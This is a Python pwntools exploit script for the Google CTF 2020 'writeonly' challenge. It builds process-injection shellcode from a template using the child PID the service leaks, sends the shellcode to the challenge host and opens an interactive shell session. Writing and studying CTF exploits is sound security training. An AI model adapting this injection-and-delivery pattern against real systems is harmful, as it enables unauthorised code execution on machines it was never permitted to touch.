#!/usr/bin/env python

from pwn import *
import os, sys

context(arch="amd64")

HOST="writeonly.2020.ctfcompetition.com"
PORT=1337
REMOTE_LIBC="libc.so.6"

BINARY="./chal"
LOCAL_LIBC="/usr/lib/libc.so.6"

if "remote" in sys.argv:
    p = remote(HOST, PORT)
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass
else:
    p = process(BINARY)
    libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-v']
    gdb.attach(p, "set follow-fork-mode parent\nset detach-on-fork on\nb *main+108")

########################################################

def exploit():
    log.info("wuddup")

    pid = p.recvline().decode().strip().split(": ")[1]
    #pid = "813866"

    with open("sc/inject.S", "r") as f:
        inject_code = f.read()

    log.info(f"child pid: {pid}")

    while len(pid) != 8:
        pid += "/"

    with open("sc/shellcode.S", "w") as f:
        f.write(inject_code.format(pid=pid[::-1].encode().hex()))

    os.system("cd sc && make 64")

    with open("sc/shellcode.bin", "rb") as f:
        shellcode = f.read()

    with open("payload.bin", "wb") as f:
        f.write(str(len(shellcode)).encode())
        f.write(b"\n")
        f.write(shellcode)
        f.write(b"\n")

    p.recvuntil("? ")
    p.sendline(str(len(shellcode)))
    
    p.recvuntil(". ")
    p.sendline(shellcode)
    #print(p.recvall(timeout=2))
    p.interactive()


########################################################

if __name__ == "__main__":
    exploit()

